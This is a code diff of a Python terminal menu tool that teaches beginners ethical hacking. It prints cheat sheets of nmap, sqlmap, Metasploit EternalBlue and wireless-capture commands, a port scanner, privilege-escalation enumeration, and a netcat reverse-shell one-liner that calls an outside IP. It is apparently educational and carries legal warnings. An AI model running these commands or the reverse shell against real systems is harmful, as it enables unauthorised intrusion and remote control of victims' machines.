+{Colors.GREEN}For Python packages:{Colors.END}
+pip install requests bs4 scapy
+
+{Colors.YELLOW}⚠️ Note: Some tools may require root access{Colors.END}
+""")
+    press_enter_to_continue()
+
+def show_cheat_sheets():
+    clear_screen()
+    print_banner()
+    print(f"{Colors.BOLD}{Colors.CYAN}📋 CHEAT SHEETS{Colors.END}\n")
     
     content = f"""
-    <div class="panel">
-        <div style="position:relative">
-            <a href="/" style="color:#00ffd6; text-decoration:none;">← Back</a>
-            <h1 style="margin:20px 0;color:#00ffd6">🖥️ System Check</h1>
-            
-            <div class="terminal">{output}</div>
-            
-            <div style="margin-top:20px">
-                <a class="btn" href="/tools">Tools Guide</a>
-            </div>
-        </div>
-    </div>
-    """
-    return render_template_string(HTML.replace('</body>', f'{content}</body>').replace('HCO Terminal — Hackers Colony Portal', 'System Check - HCO Terminal'))
+{Colors.GREEN}🔐 Common Ports:{Colors.END}
+21 - FTP     22 - SSH       80 - HTTP
+443 - HTTPS 3306 - MySQL   5432 - PostgreSQL
+3389 - RDP  5900 - VNC     27017 - MongoDB
 
-def open_browser():
-    """Open web browser when server starts"""
-    time.sleep(2)
-    webbrowser.open(f'http://{HOST}:{PORT}')
+{Colors.YELLOW}🌐 Nmap Cheat Sheet:{Colors.END}
+nmap -sS -sV -O target.com          # Stealth scan + version + OS
+nmap -A -T4 target.com              # Aggressive scan
+nmap -p 80,443,22 target.com        # Specific ports
+nmap -sU -p 53,67,68 target.com     # UDP scan
+nmap --script vuln target.com       # Vulnerability scripts
 
-def cleanup():
-    """Cleanup function"""
+{Colors.CYAN}🕸 Web Testing:{Colors.END}
+• Always get permission first
+• Use Burp Suite for web apps
+• Test for: SQLi, XSS, CSRF, LFI/RFI
+• Check: Headers, Cookies, Forms
+
+{Colors.RED}🐧 Linux Commands:{Colors.END}
+ls -la                              # List all files
+chmod +x script.sh                  # Make executable
+grep "pattern" file.txt             # Search text
+find / -name "file" 2>/dev/null     # Find files
+netstat -tuln                       # Open ports
+
+{Colors.PURPLE}🐍 Python for Hacking:{Colors.END}
+import requests
+import socket
+import subprocess
+import os
+
+# Port scanner example
+for port in range(1, 100):
     try:
-        if os.path.exists("hco_cheatsheet.txt"):
-            os.remove("hco_cheatsheet.txt")
+        s = socket.socket()
+        s.connect(('target', port))
+        print(f"Port {{port}} open")
     except:
         pass
 
+{Colors.GREEN}📝 Legal Notice:{Colors.END}
+ONLY test systems you own or have explicit written permission to test.
+Unauthorized access is ILLEGAL and UNETHICAL.
+"""
+    print(content)
+    
+    print(f"\n{Colors.YELLOW}Save to file? (y/n): {Colors.END}", end='')
+    choice = input().lower()
+    if choice == 'y':
+        filename = "hco_cheatsheet.txt"
+        with open(filename, 'w') as f:
+            f.write(content.replace(Colors.GREEN, '').replace(Colors.YELLOW, '').replace(Colors.CYAN, '').replace(Colors.RED, '').replace(Colors.PURPLE, '').replace(Colors.END, '').replace(Colors.BOLD, ''))
+        print(f"{Colors.GREEN}Cheat sheet saved as: {filename}{Colors.END}")
+    
+    press_enter_to_continue()
+
+def show_quick_commands():
+    clear_screen()
+    print_banner()
+    print(f"{Colors.BOLD}{Colors.CYAN}🚀 QUICK START COMMANDS{Colors.END}\n")
+    
+    content = f"""
+{Colors.GREEN}🔰 Beginner Commands:{Colors.END}
+
+# Network scanning
+nmap -sS 192.168.1.1/24
+nmap -A -T4 target.com
+
+# Web application testing
+nikto -h http://target.com
+dirb http://target.com
+
+# Information gathering
+whois target.com
+dig target.com ANY
+
+{Colors.YELLOW}🎯 Intermediate Commands:{Colors.END}
+
+# SQL injection testing
+sqlmap -u "http://site.com/page?id=1" --dbs
+sqlmap -u "http://site.com/page?id=1" -D dbname --tables
+
+# Metasploit framework
+msfconsole
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 192.168.1.100
+exploit
+
+# Wireless testing (requires monitor mode)
+airmon-ng start wlan0
+airodump-ng wlan0mon
+
+{Colors.RED}🏆 Advanced Commands:{Colors.END}
+
+# Reverse shell (Netcat)
+nc -lvnp 4444                          # Attacker
+bash -i >& /dev/tcp/1.2.3.4/4444 0>&1  # Victim
+
+# Privilege escalation
+sudo -l
+find / -perm -4000 2>/dev/null
+cat /etc/passwd | grep bash
+
+# Packet analysis
+tcpdump -i eth0 -w capture.pcap
+wireshark capture.pcap
+
+{Colors.CYAN}🛡 Defensive Commands:{Colors.END}
+
+# Check open ports
+netstat -tuln
+ss -tuln
+
+# Process monitoring
+ps aux | grep suspicious
+top
+
+# File integrity
+find / -type f -perm -4000 2>/dev/null
+ls -la /etc/passwd /etc/shadow
+"""
+    print(content)
+    press_enter_to_continue()
+
+def main():
+    while True:
+        clear_screen()
+        print_banner()
+        print(f"{Colors.GREEN}Welcome to Hackers Colony Terminal!{Colors.END}")
+        print(f"{Colors.YELLOW}Ethical learning, practice labs & community{Colors.END}")
+        print(f"{Colors.RED}⚠️ Only test systems you own or have permission to test{Colors.END}\n")
+        
+        print_menu()
+        
+        try:
+            choice = input().strip()
+            
+            if choice == '0':
+                print(f"\n{Colors.GREEN}Thank you for using HCO Terminal! Stay ethical! 🛡️{Colors.END}")
+                break
+            elif choice == '1':
+                show_learn_hacking()
+            elif choice == '2':
+                show_practice_labs()
+            elif choice == '3':
+                show_tools_guide()
+            elif choice == '4':
+                show_ctf_challenges()
+            elif choice == '5':
+                show_community_links()
+            elif choice == '6':
+                show_system_check()
+            elif choice == '7':
+                show_cheat_sheets()
+            elif choice == '8':
+                show_quick_commands()
+            else:
+                print(f"\n{Colors.RED}Invalid choice! Please enter 0-8{Colors.END}")
+                time.sleep(1)
+                
+        except KeyboardInterrupt:
+            print(f"\n\n{Colors.GREEN}Thank you for using HCO Terminal! Stay ethical! 🛡️{Colors.END}")
+            break
+
 if __name__ == '__main__':
-    # Register cleanup
-    import atexit
-    atexit.register(cleanup)
-    
-    # Open browser
-    if len(sys.argv) > 1 and sys.argv[1] == '--no-browser':
-        print(f"Server starting at http://{HOST}:{PORT}")
-    else:
-        threading.Thread(target=open_browser).start()
-    
-    # Start Flask app
-    print(f"""
-    🚀 HCO Terminal Starting...
-    📍 Local: http://{HOST}:{PORT}
-    🔧 Press Ctrl+C to stop
-    
-    Features:
-    ✅ Learn Ethical Hacking Path
-    ✅ Practice Labs Setup Guides  
-    ✅ Tools Installation Check
-    ✅ CTF Challenges Resources
-    ✅ Downloadable Cheat Sheets
-    ✅ Community Links
-    
-    ⚠️  Educational Use Only - Stay Ethical!
-    """)
-    
     try:
-        app.run(host=HOST, port=PORT, debug=False)
+        main()
     except KeyboardInterrupt:
-        print("\n\n🛑 Server stopped. Thank you for using HCO Terminal!")
-        cleanup()
+        print(f"\n{Colors.GREEN}Goodbye! Stay ethical! 🛡️{Colors.END}")
